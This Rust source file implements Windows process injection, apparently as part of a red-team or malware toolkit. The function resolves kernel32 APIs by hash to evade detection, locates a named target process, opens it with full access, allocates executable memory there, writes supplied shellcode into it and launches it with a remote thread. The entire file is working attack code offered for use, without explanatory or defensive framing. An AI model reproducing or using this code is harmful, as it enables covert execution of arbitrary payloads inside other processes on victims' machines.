use core::ffi::c_void;
use std::{mem, ptr};
use windows::Win32::Foundation::{BOOL, HANDLE};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CREATE_TOOLHELP_SNAPSHOT_FLAGS, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
};
use windows::Win32::System::Threading::{PROCESS_ACCESS_RIGHTS, PROCESS_ALL_ACCESS};

pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
    // Get location of Kernel32.dll
    let kernel32 = rco_utils::find_library_address("Kernel32").unwrap();

    // See line 11
    let function = rco_utils::find_function_address(kernel32, 0x139872fd098af4a7).unwrap();
    let function = rco_utils::construct_win32_function!(function; [CREATE_TOOLHELP_SNAPSHOT_FLAGS, u32]; [HANDLE]);
    let snapshot = unsafe { function(TH32CS_SNAPPROCESS, 0_u32) };

    // See line 20
    let function = rco_utils::find_function_address(kernel32, 0x4cf400a249844bee).unwrap();
    let function = rco_utils::construct_win32_function!(function; [HANDLE, &mut PROCESSENTRY32]; [BOOL]);
    let mut pid = 0_u32;
    let mut process_entry = PROCESSENTRY32 {
        dwSize: mem::size_of::<PROCESSENTRY32>() as u32,
        ..Default::default()
    };
    while unsafe { function(snapshot, &mut process_entry).as_bool() } {
        let mut process_name = String::from("");
        for element in process_entry.szExeFile {
            if element == 0 {
                break;
            }
            process_name.push(element as char);
        }
        if process_name.contains(target_process) {
            pid = process_entry.th32ProcessID;
            break;
        }
    }

    // See line 46
    let function = rco_utils::find_function_address(kernel32, 0x2c116091e452cf52).unwrap();
    let function = rco_utils::construct_win32_function!(function; [PROCESS_ACCESS_RIGHTS, bool, u32]; [HANDLE]);
    let explorer_handle = unsafe { function(PROCESS_ALL_ACCESS, false, pid) };

    // See line 55
    let function = rco_utils::find_function_address(kernel32, 0x5cfd66a14ed9a43).unwrap();
    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const u32, usize, VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS]; [*const c_void]);
    let base_address = unsafe {
        function(
            explorer_handle,
            ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    // See line 68
    let function = rco_utils::find_function_address(kernel32, 0x2638fa76194bfe63).unwrap();
    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *const c_void, usize, *mut usize]; [()]);
    unsafe {
        function(
            explorer_handle,
            base_address,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            ptr::null_mut(),
        )
    };

    // See line 84
    let function = rco_utils::find_function_address(kernel32, 0x2a0b247f3bdeef70).unwrap();
    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const u32, u32, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *const u32, u32, *mut u32]; [()]);
    let start_address_option = unsafe { Some(mem::transmute(base_address)) };
    unsafe {
        function(
            explorer_handle,
            ptr::null(),
            0,
            start_address_option,
            ptr::null(),
            0,
            ptr::null_mut(),
        )
    };
}
